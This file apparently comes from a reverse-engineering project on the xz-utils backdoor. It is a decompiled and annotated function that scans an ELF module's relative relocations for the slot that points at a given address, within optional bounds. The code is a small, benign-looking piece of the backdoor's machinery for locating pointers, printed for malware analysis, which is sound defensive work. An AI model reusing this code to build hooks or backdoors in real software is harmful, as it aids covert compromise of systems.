// /home/kali/xzre-ghidra/xzregh/101B90_elf_rela_find_relative_slot.c
// Function: elf_rela_find_relative_slot @ 0x101B90
// Calling convention: __stdcall
// Prototype: Elf64_Rela * __stdcall elf_rela_find_relative_slot(elf_info_t * elf_info, void * target_addr, u8 * slot_lower_bound, u8 * slot_upper_bound, ulong * resume_index_ptr)


/*
 * AutoDoc: Searches the RELA relocation array for an entry tied to a given code/data pointer. When `target_addr` is non-NULL it is treated
 * as an absolute address inside the module: the helper subtracts `elfbase` to match against `r_addend` and, on success, returns
 * the relocated slot at `r_offset`. When the argument is NULL the caller instead wants the raw addend pointer, so the helper
 * immediately returns `elfbase + r_addend`.
 *
 * Callers can optionally supply `[slot_lower_bound, slot_upper_bound]` bounds plus a `resume_index_ptr`. The bounds force the
 * returned address to fall inside a desired window and the resume cursor allows the next invocation to continue scanning without
 * starting over. Failing to find a match (or discovering that the module never exposed RELA relocations) yields NULL and, if a
 * cursor pointer was provided, stores the position it stopped at.
 */

#include "xzre_types.h"

Elf64_Rela *
elf_rela_find_relative_slot
          (elf_info_t *elf_info,void *target_addr,u8 *slot_lower_bound,u8 *slot_upper_bound,
          ulong *resume_index_ptr)

{
  Elf64_Ehdr *elfbase;
  Elf64_Rela *rela_cursor;
  ulong rela_index;
  
  // AutoDoc: Bail out immediately when the module never published RELA entries.
  if (((elf_info->feature_flags & 2) == 0) || (elf_info->rela_reloc_count == 0)) {
    return (Elf64_Rela *)0x0;
  }
  rela_index = 0;
  if (resume_index_ptr != (ulong *)0x0) {
    rela_index = *resume_index_ptr;
  }
  elfbase = elf_info->elfbase;
  do {
    if (elf_info->rela_reloc_count <= rela_index) {
      if (resume_index_ptr != (ulong *)0x0) {
        *resume_index_ptr = rela_index;
      }
      return (Elf64_Rela *)0x0;
    }
    rela_cursor = elf_info->rela_relocs + rela_index;
    // AutoDoc: Only R_X86_64_RELATIVE entries are interesting here; everything else is ignored.
    if ((int)rela_cursor->r_info == 8) {
      if (target_addr == (void *)0x0) {
        rela_cursor = (Elf64_Rela *)((u8 *)elfbase + rela_cursor->r_addend);
      }
      else {
        if (rela_cursor->r_addend != (long)target_addr - (long)elfbase) goto LAB_00101c07;
        rela_cursor = (Elf64_Rela *)((u8 *)elfbase + rela_cursor->r_offset);
        if (slot_lower_bound == (u8 *)0x0) goto LAB_00101c18;
      }
      // AutoDoc: Honor the optional `[low, high]` window before handing the relocation slot back to the caller.
      if ((slot_lower_bound <= rela_cursor) && (rela_cursor <= slot_upper_bound)) {
LAB_00101c18:
        if (resume_index_ptr == (ulong *)0x0) {
          return rela_cursor;
        }
        *resume_index_ptr = rela_index + 1;
        return rela_cursor;
      }
    }
LAB_00101c07:
    rela_index = rela_index + 1;
  } while( TRUE );
}

